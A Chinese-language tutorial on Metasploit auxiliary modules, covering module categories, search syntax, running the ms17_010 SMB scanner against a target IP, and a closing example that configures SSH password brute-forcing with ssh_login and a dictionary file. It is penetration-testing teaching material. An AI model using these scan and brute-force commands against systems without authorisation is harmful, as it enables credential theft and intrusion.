说明：我们知道msf辅助模块有上千个，主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ测试发掘漏洞、实施网络协议欺骗等

# 一、怎么查询 Auxiliary辅助模块

我们可以通过以下命令查询所有 Auxiliary辅助模块

use auxiliary/ 或   show auxiliary

# 二、 Auxiliary辅助模块分类

---

#### admin

---

/admin/android

/admin/http

/admin/mysql/

/admin/oracle/

/admin/vmware/

/admin/smb/

---

#### dos

---

/dos/android/

/dos/http/

/dos/cisco/

/dos/dns/

/dos/smb/

/dos/windows/ftp/

---

#### fuzzers

---

/fuzzers/http/

/fuzzers/smb/

/gather/

---

#### scanner

---

/scanner/portscan/

/scanner/ftp/

/scanner/http/

/scanner/ssh/

/scanner/smb/

/scanner/vmware/

/scanner/vnc/

/scanner/telnet/

/scanner/msyql/

/scanner/ntp/

/scanner/openvas/

/scanner/sap/

#### server

/server/

# 三、通过分类查询指定模块

通过search查询指定模块

search type:auxiliary name:smb

type： 后门跟的的模块类型   name ： 后门跟的就是要搜的模块名

# 四、怎么调用模块

我们调一个smb模块演示

1 查询与SMB	相关的辅助模块

search type:auxiliary name:smb

2 加载一个ms17_010探测模块

use auxiliary/scanner/smb/smb_ms17_010

3 查看载入模块需要配置的参数

show options

![[1645511393570.png]]

set RHOSTS 192.168.110.110   (设定目标IP)

set THREADS 10    （如果觉得探测过慢可以增加线程，根据电脑实际性能来不要配置太多 个人建议最大10）

run （执行探测）

![[1645511404119.png]]

![[1645511415106.png]]

# 五、更多

1 whois查看域名或IP信息  （hu yi zi）

whois www.baidu.com

whois 192.168.0.1

2  利用辅助模块查找邮箱

use auxiliary/gather/search_email_collector

3 DNS枚举，使用auxiliary模块下的DNS枚举模块：

use auxiliary/gather/enum_dns

4 ssh爆破，使用auxiliary模块下的ssh_login

use /auxiliary/scanner/ssh/ssh_login

set RHOSTS 192.168.1.92   (设定目标IP)
set USERNAME root    （设定ssh登陆账户）
set PASS_FILE /kevin/ssh_passwd.txt   （设定暴力字典）
set THREADS 100           (线程设置为100)
show options                   (查看更改后的参数)12345

run   开始爆破